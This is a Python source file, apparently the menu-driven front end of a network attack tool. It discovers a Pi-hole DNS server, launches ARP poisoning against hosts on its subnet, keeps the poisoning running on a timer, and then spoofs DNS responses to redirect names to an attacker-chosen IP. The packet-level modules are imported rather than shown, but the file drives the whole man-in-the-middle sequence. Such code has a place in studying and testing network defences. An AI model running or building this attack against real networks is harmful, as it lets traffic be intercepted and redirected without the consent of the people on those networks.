from scapy.all import *
from dns import Dns
from arp import Arp
from discovery import Discovery
from configuration import *

from RepeatedTimer import RepeatedTimer

class CLI:

    conf = Configuration()
    disc = Discovery(conf.getNumberOfHosts(), conf.getSimilarResponses(), conf.getNumberOfHosts())
    dns = None
    arp = Arp()
    PiIP = ""
    ARPresult = False
    thread = None

    mainText = "Enter the number of the method you want to use:\n\
        1. Pi-hole discovery\n\
        2. ARP Poisoning\n\
        3. DNS Poisoning\n\
        4. Exit\n"




    def mainCLI(self):
        while True:
            inp = input(self.mainText)
            if inp.lower().strip() == "1":  # Discovery
                self.discoveryCLI()
            elif inp.lower().strip() == "2":  # ARP Poisoning
                self.ARPCLI()
            elif inp.lower().strip() == "3":  # DNS Poisoning
                self.DNSCLI()
            elif inp.lower().strip() == "4":  # Exit
                print("Quitting...")
                if self.thread is not None:
                    print("   Stopping ARP poisoning")
                    self.thread.stop()
                sys.exit()
            else:  # Error
                print("Please only enter a number 1-4\n")


    # =========================== Discovery ==============================

    def discoveryCLI(self):
        print("You are about to search for the Pi-hole with settings: ")
        print("   DnsQueryTimeout:  {} ms".format(self.conf.getDNSQueryTimeout()))
        print("   SimilarResp:      {}%".format(self.conf.getSimilarResponses()))
        print("   NumberOfHosts:    {}".format(self.conf.getNumberOfHosts()))
        print("   DNSServer:        {}".format(self.conf.getDNSsetting()))
        print("   HostsURL          {}".format(self.conf.getHostsURL()))
        inp = input("Do you want to continue? (Y/n): ")

        if inp.lower().strip() == "y" or inp.lower().strip() == "yes" or len(inp.strip()) == 0:
            print("\n")
            self.PiIP = self.disc.getPi(self.conf.getDNSQueryTimeout(), self.conf.getDNSsetting())
            if not self.PiIP == None:
                print("Pi-hole was found at " + self.PiIP + "\nYou can continue with ARP Poisoning")
            else:
                print("No Pi-hole was found")
            return
        elif inp.lower().strip() == "n" or inp.lower().strip() == "no":
            return
        else:
            print("Invalid answer, please answer Y or N\n")
            self.discoveryCLI()
            return


    # ================================= ARP ====================================

    # For multi-threading
    def ARPPoisoning(self, setting):
        if len(setting) == 2:
            self.arp.poison_all(self.conf.getDNSsetting(), self.PiIP, self.arp.get_dns_mac(self.PiIP))
        else:
            self.arp.poison_all(self.conf.getARPtarget(), self.PiIP, self.arp.get_dns_mac(self.PiIP))


    def ARPCLI(self):
        if self.thread is None:
            if self.PiIP == "" or self.PiIP is None:
                print("IP of the Pi-hole was not set, please run Discovery first.")
                return
            print("You are about to initiate ARP poisoning with settings: ")
            print("   NetworkInterface: " + self.conf.getNetworkInterface())
            setting = '{}'.format(self.conf.getARPtarget())
            if len(setting) == 2:
                print("   ARPtargets: " + self.conf.getDNSsetting())
            else:
                print("   ARPtargets: " + setting)

            print("   ARPdelay:  {} sec".format(self.conf.getARPdelay()))

            inp = input("Do you want to continue? (Y/n): ")

            if inp.lower().strip() == "y" or inp.lower().strip() == "yes" or len(inp.strip()) == 0:

                # ARP poisoning, initial call

                # If target is all hosts on DNS server's subnet
                if len(setting) == 2:
                    print("Performing poisoning on " + self.conf.getDNSsetting())
                    if self.arp.poison_all(self.conf.getDNSsetting(), self.PiIP, self.arp.get_dns_mac(self.PiIP)):
                        self.ARPresult = True

                # Otherwise
                else:
                    print("Performing poisoning on " + self.conf.getARPtarget())
                    if self.arp.poison_all(self.conf.getARPtarget(), self.PiIP, self.arp.get_dns_mac(self.PiIP)):
                        self.ARPresult = True

                if self.ARPresult:
                    print("Pi-hole was successfully poisoned")
                    # ARP poisoning, threading
                    self.thread = RepeatedTimer(self.conf.getARPdelay(), self.ARPPoisoning, setting)
                    self.thread.start()

                    self.mainText = "Enter the number of the method you want to use:\n\
                            1. Pi-hole discovery\n\
                            2. Stop ARP Poisoning\n\
                            3. DNS Poisoning\n\
                            4. Exit\n"
                    return
                else:
                    print("Poisoning was not successful. Please try again.")
                    return
            elif inp.lower().strip() == "n" or inp.lower().strip() == "no":
                return
            else:
                print("Invalid answer, please answer Y or N\n")
                self.ARPCLI()
                return

        # ARP Poisoning already running
        else:
            inp = input("You are about to stop the ARP poisoning, are you sure? (Y/N)")
            if inp.lower().strip() == "y" or inp.lower().strip() == "yes" or len(inp.strip()) == 0:
                # Stop thread and restore ARP tables
                self.thread.stop()
                self.arp.restore_all(self.conf.getARPtarget(), self.PiIP, self.arp.get_dns_mac(self.PiIP))
                self.thread = None
                print("ARP poisoning successfully stopped.")
                self.mainText = "Enter the number of the method you want to use:\n\
                        1. Pi-hole discovery\n\
                        2. ARP Poisoning\n\
                        3. DNS Poisoning\n\
                        4. Exit\n"
                return
            elif inp.lower().strip() == "n" or inp.lower().strip() == "no":
                print("Cancelling...")
                return
            else:
                print("Invalid answer, please answer Y or N\n")
                self.ARPCLI()
                return

    # ================================= DNS ===================================

    def DNSCLI(self):
        if not self.ARPresult:
            print("ARP Poisoning was not completed successfully, please do this first.")
            return
        print("You are about to replace DNS responses of the Pi-hole with settings: ")
        print("   PoisonType:      {}".format(self.conf.getPoisonType()))
        print("   ReplaceIP:       {}".format(self.conf.getReplaceIP()))
        print("   SpoofingTimeout: {}".format(self.conf.getSpoofingTimeout()))
        inp = input("Do you want to continue? (Y/n): ")

        if inp.lower().strip() == "y" or inp.lower().strip() == "yes" or len(inp.strip()) == 0:
            # Ask if we should run in verbose mode
            verbose = input("Do you want to run in verbose mode? (Y/n): ")
            if verbose.lower().strip() == "y" or verbose.lower().strip() == "yes" or len(verbose.strip()) == 0:
                self.dns = Dns(self.PiIP, self.conf.getReplaceIP(), self.conf.getPoisonType(), self.conf.getNetworkInterface(), True)
            else:
                self.dns = Dns(self.PiIP, self.conf.getReplaceIP(), self.conf.getPoisonType(), self.conf.getNetworkInterface(), False)
            print("\n")
            # Start spoofing
            self.dns.poison()
        elif inp.lower().strip() == "n" or inp.lower().strip() == "no":
            return
        else:
            print("Invalid answer, please answer Y or N\n")
            self.DNSCLI()
            return
